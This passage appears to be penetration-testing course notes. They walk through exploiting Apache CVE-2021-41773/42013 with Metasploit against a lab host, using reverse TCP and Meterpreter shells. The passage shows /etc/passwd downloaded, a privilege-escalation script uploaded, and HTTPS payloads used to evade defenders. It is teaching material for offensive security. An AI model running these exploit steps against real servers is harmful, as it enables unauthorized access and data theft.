  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
  it can be used to execute arbitrary commands (Remote Command Execution).
  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  https://nvd.nist.gov/vuln/detail/CVE-2021-42013
  https://httpd.apache.org/security/vulnerabilities_24.html
  https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse
  https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml
  https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74
  https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis


View the full module info with the info -d command.

msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads 

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   0   payload/generic/custom                                             normal  No     Custom Payload
   1   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
   2   payload/generic/shell_bind_aws_ssm                                 normal  No     Command Shell, Bind SSM (via AWS API)
   3   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
   4   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
   5   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
   6   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
   7   payload/linux/x64/exec                                             normal  No     Linux Execute Command
   8   payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
   9   payload/linux/x64/meterpreter/reverse_sctp                         normal  No     Linux Mettle x64, Reverse SCTP Stager
   10  payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager
   11  payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
   12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   13  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
   14  payload/linux/x64/pingback_bind_tcp                                normal  No     Linux x64 Pingback, Bind TCP Inline
   15  payload/linux/x64/pingback_reverse_tcp                             normal  No     Linux x64 Pingback, Reverse TCP Inline
   16  payload/linux/x64/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager
   17  payload/linux/x64/shell/reverse_sctp                               normal  No     Linux Command Shell, Reverse SCTP Stager
   18  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   19  payload/linux/x64/shell_bind_ipv6_tcp                              normal  No     Linux x64 Command Shell, Bind TCP Inline (IPv6)
   20  payload/linux/x64/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   21  payload/linux/x64/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   22  payload/linux/x64/shell_reverse_ipv6_tcp                           normal  No     Linux x64 Command Shell, Reverse TCP Inline (IPv6)
   23  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   24  payload/linux/x86/chmod                                            normal  No     Linux Chmod
   25  payload/linux/x86/exec                                             normal  No     Linux Execute Command
   26  payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   27  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   28  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   29  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   30  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   31  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   32  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   33  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   34  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   35  payload/linux/x86/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
   36  payload/linux/x86/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   37  payload/linux/x86/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
   38  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   39  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   40  payload/linux/x86/read_file                                        normal  No     Linux Read File
   41  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   42  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   43  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   44  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   45  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   46  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   47  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   48  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   49  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   50  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
   51  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   52  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   53  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   54  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 18
payload => linux/x64/shell/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
                                         1773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:h
                                         ost:port][...]
   RHOSTS     192.168.250.16   yes       The target host(s), see https://docs.metasploi
                                         t.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.182   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Dropper)



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.45.182:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.250.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.250.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.250.16:80 - Sending linux/x64/shell/reverse_tcp command payload
[*] Sending stage (38 bytes) to 192.168.250.16
[*] Command shell session 1 opened (192.168.45.182:4444 -> 192.168.250.16:37752) at 2023-11-21 07:20:02 -0800
[!] This exploit may require manual cleanup of '/tmp/WcSEQB' on the target

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
- Be sure to check all options.
 - Target port 80, `set SSL false`
- The send stage was only 38 bytes in size.
 - Perfect for space constraints.

##### Meterpreter Payload

We used a common TCP rev shell in the last section, which provided an interactive shell on the target system, but we only had the functionality of a regular command shell.  Exploit frameworks often contain more advanced payloads providing features like file transfer, pivoting, and various other methods of interaction.

Metasploit contains the [Meterpreter](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html) payload, a multi-function payload that can be dynamically extended at run-time.  the payload resides entirely in memory on the target and its comms are encrypted by default.  Meterpreter offers capabilities that are especially useful in the post-exploitation phase and is available for various OS.
- Windows.
- Linux.
- MacOS.
- Android.
- And more.

Let's display all compatible payloads in the exploit module from the prior section and search for Meterpreter payloads.  Activate a non-staged 64-bit Meterpreter TCP reverse shell payload and display its options.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   13  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
...

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 13
payload => linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
                                         1773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:h
                                         ost:port][...]
   RHOSTS     192.168.250.16   yes       The target host(s), see https://docs.metasploi
                                         t.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.182   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Dropper)



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/apache_normalize_path_rce) >
```

We should not that all Meterpreter payloads are staged, however the output contains staged and non-staged payloads.  The difference is in how Meterpreter payload is transferred to the target machine.  Non-staged version includes all components required to launch a Meterpreter session while the staged version uses a seperate first stage to load these [components](https://buffered.io/posts/staged-vs-stageless-handlers/).  Loading components over the network creates some traffic and may alert defensive systems.  When our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, the non-staged Meterpreter payload comes in handy.  We will use the non-staged version for the rest of the module.

Run the module with our Meterpreter payload and display available commands when obtain a prompt with `help`.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.45.182:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.250.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.250.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.250.16:80 - Sending linux/x64/meterpreter_reverse_tcp command payload
[*] Meterpreter session 2 opened (192.168.45.182:4444 -> 192.168.250.16:35258) at 2023-11-21 07:50:14 -0800
[!] This exploit may require manual cleanup of '/tmp/NbyT' on the target

meterpreter > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    bg            Alias for background
    bgkill        Kills a background meterpreter script
    bglist        Lists running background scripts
    bgrun         Executes a meterpreter script as a background thread
    channel       Displays information or control active channels
    close         Closes a channel
    detach        Detach the meterpreter session (for http/https)
    disable_unic  Disables encoding of unicode strings
    ode_encoding
    enable_unico  Enables encoding of unicode strings
    de_encoding
    exit          Terminate the meterpreter session
    guid          Get the session GUID
    help          Help menu
    info          Displays information about a Post module
    irb           Open an interactive Ruby shell on the current session
    load          Load one or more meterpreter extensions
    machine_id    Get the MSF ID of the machine attached to the session
    pry           Open the Pry debugger on the current session
    quit          Terminate the meterpreter session
    read          Reads data from a channel
    resource      Run the commands stored in a file
    run           Executes a meterpreter script or Post module
    secure        (Re)Negotiate TLV packet encryption on the session
    sessions      Quickly switch to another session
    use           Deprecated alias for "load"
    uuid          Get the UUID for the current session
    write         Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    chmod         Change the permissions of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    shell         Drop into a system command shell
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: Webcam Commands
=======================

    Command       Description
    -------       -----------
    webcam_chat   Start a video chat
    webcam_list   List webcams
    webcam_snap   Take a snapshot from the specified webcam
    webcam_strea  Play a video stream from the specified webcam
    m


Stdapi: Mic Commands
====================

    Command       Description
    -------       -----------
    listen        listen to a saved audio recording via audio player
    mic_list      list all microphone interfaces
    mic_start     start capturing an audio stream from the target mic
    mic_stop      stop capturing audio


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system

meterpreter >
```
- We receive a promt a few seconds after launching the module.
- Commands are divided into categories.
 - System Commands.
 - Networking Commands.
 - File System Commands.

Let's get familiar with some of the Meterpreter commands, we start gathering info by entering `sysinfo` and `getuid`.
```
meterpreter > sysinfo
Computer     : 172.29.0.2
OS           : Ubuntu 20.04 (Linux 5.4.0-132-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: daemon
meterpreter >
```
- Providing us with info about the target computer, OS, and the current user.

As we learned, Metasploit uses sessions to manage access to different machines.  When Metasploit interacts with a system in a session, it uses a concept named channels.  We can start an interactive shell by entering `shell`, execute a command in the context of a channel, and background the channel the shell runs in.  We use `Ctrl+Z` to background a channel.
```
meterpreter > shell
Process 135 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background channel 1? [y/N]  y
meterpreter >
```

Next we start a second interactive shell, exec a command, and background the channel.
```
meterpreter > shell
Process 137 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
meterpreter >
```

Now we can list all active channels and interact with channel 1 again, enter `channel -l` to list, and `channel -i` with the channel ID as arg to interact.
```
meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process

meterpreter > channel -i 1
Interacting with channel 1...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
- We have executed commands in the context of channel 1 again.
- Using channels will help us to manage system access and perform post-exploitation ops.

next we will use the `download` and `upload` commands from the File System Commands category to transfer files to and from the system.  Let's review the commands in this category again.
```
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    chmod         Change the permissions of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory
```
- Shows various commands we can use for FS ops.
 - Commands with `l` prefix operate on the local system.
  - Change dir for up/down-loading files for instance.

Download `/etc/passwd` from the target machine to our Kali system.  Change local dir to `/home/$USER/Downloads` first, enter the `download` command, with `/etc/passwd` as arg.
```
meterpreter > lcd /home/operator/Downloads/
meterpreter > lpwd
/home/operator/Downloads
meterpreter > download /etc/passwd 
[*] Downloading: /etc/passwd -> /home/operator/Downloads/passwd
[*] Downloaded 926.00 B of 926.00 B (100.0%): /etc/passwd -> /home/operator/Downloads/passwd
[*] Completed  : /etc/passwd -> /home/operator/Downloads/passwd
meterpreter > lcat /home/operator/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...
```
- We were able to download `/etc/passwd` to our local machine.

Let's assume we want to run `unix-privesc-check`, we will upload it to `/tmp`.
```
[*] Uploading  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
[*] Completed  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
meterpreter > ls /tmp
Listing: /tmp
=============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100755/rwxr-xr-x  1068672  fil   2023-11-21 07:50:12 -0800  NbyT
100644/rw-r--r--  36801    fil   2023-11-21 08:35:19 -0800  unix-privesc-check

meterpreter >
```
- Successful upload.
- If our target runs Win OS, we need to escape backslashes in dest path like `\\`

We used `linux/x64/meterpreter_reverse_tcp` payload in this section, before moving on we will explore another 64-bit Linux Meterpreter payload.  Exit the current session and use `show payloads` in the context of the exploit module again.
```
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.250.16 - Meterpreter session 2 closed.  Reason: User exit
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads 

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
```
- This payload uses HTTPS to establish connection and comm.
 - Encrypted with SSL/TLS.
 - Defenders will only see info about HTTPS requests.
  - Without further defensive tech the will be unlikely to decipher the Meterpreter comms.

Select the payload and display its options.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 12
payload => linux/x64/meterpreter_reverse_https
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
                                         1773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:h
                                         ost:port][...]
   RHOSTS     192.168.250.16   yes       The target host(s), see https://docs.metasploi
                                         t.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.182   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Dropper)



View the full module info with the info, or info -d command.
```
- There is an additional option `LURI`
 - This can be used to leverage a single listener on one port.
  - Capable of handling diff requests based on path in this option.
  - Provides logical separation.
  - If left blank it defaults to `/`

Launch the exploit by entering run, wihtout setting a `LURI` value.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started HTTPS reverse handler on https://192.168.45.182:8443
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.250.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.250.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.250.16:80 - Sending linux/x64/meterpreter_reverse_https command payload
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAqTx730zfoSrsACFYoW5fjwzxvgdHXnGod4d7eqqmNkyDHTs7kMQcYHe3EosUW6XcWLB5PFpu80SJpjF0EfuM03_L3AVlE with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAwJQvUsTeawiHJ1B-friDYPN2vMJcTRkKI-6DlB5jIsY2InArKsI9U1o49Vnqhx-sk0YUDWkeZBSm63S8LEH8LiNS with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAo3G6LOwsFINkC_M8Qczhp9j8VhlKHsZCT1icQUJGBzk-T9PM-rllg2SkBFGeuGL2RDNwDoIL with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAnRUu-z-CCHMIDsui3rn8KPEnB5Y24YK8ZRw77FGRq7nMQdHF3cUF8LcVKOa5FZUTMuSORtQPE8ibvgC7-DXg-fBFgW-gm3 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAOgRr3AYHMIuOIq3xdvt1NmMKXDaoh-33EodMKiEhvYg1uUuSM700PQCo2_yRPM899ClfSEt0AYC56z7_yvWlp4NiN6L with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAFwxcCSHDgeH3aZh5ZNm3hVOK5SrupKHyEG-KJGLqhS4GiGxAvwEbL17OqshOlOlcdy8 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAgGDsL4_c5h-AHMD6Jp9qP_LZVUVq8WRysdmZ21gEg9oEuXIZh7P with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDApPBBxRgKbCcQVsCTT5G1yEjtuGSLqtPSm9fPdMfbI0OddBCPH6iLlVbYUbJciBLn_gDnO3AnmOve3RqNr9bc6e2GJXLgoh1KvDZ6 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAQhFSLj6hnOejbYWCEoXZVlbmLvjOjIHX8IV-xsRnPzltuISuKMWcXH6pLNI with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDAR5SYiee7fbnbdzJ5koUc1TYAEp0AggZKxEeIaF0Y643wXYLbPE94j2n-LmVyD6AhsrFPkzoGVm3ts4Ad4LNm5hMCUk0Nf with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDA4Q4uQOPdpZYzCwAx1OKrhAxrSlrAY1ZCaMrbijDbT9tQNkPEhQcjcHcPu7MjVJFlw with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQzD0b8aNBi9gxkqcnY116_liHreCOZRfTKtuWxe5o6YhMxBEBFgz46G3KpQf-d9aCsJaehL with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQ5_EKfAHV01yJqCe-QzMErK5_-MQmz8drn33VvlWloS2o3BGzxOKtm9WDGZ7QLPLB3QF7pN_OY4tdHj6aG1Op787iFRIhAcAiUtkql7BQ with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQbO9IRRzu0QO-tMG8GEiZD with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQax0xSdo0QMoVbWqP72-OzspMIeMPOsD8kVxJ1oPOoPzciLsZhfxFvJ6hC0ZPj_sCZusggjdbDhqm4ZG8v6iF0DPqMmNHbFLys7H1bMn with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQ-fep7hPJht-qfOydgyKicLb-gahgWdAplEru2J with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQkfY3N8Yny-CoUBUsWhQ8u9jov91hZzBEEatT_902oVw_EG4 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQ_O8k5BmO1_AqBt_0I28vHSUubmOpTjmg8Y8tHa7K_wGhwCffj with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
[*] https://192.168.45.182:8443 handling request from 192.168.250.16; (UUID: lkzu2yrq) Redirecting stageless connection from /zLOyqwFEyjhBOkc4JGafDQT0FDKsdgRv7 with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
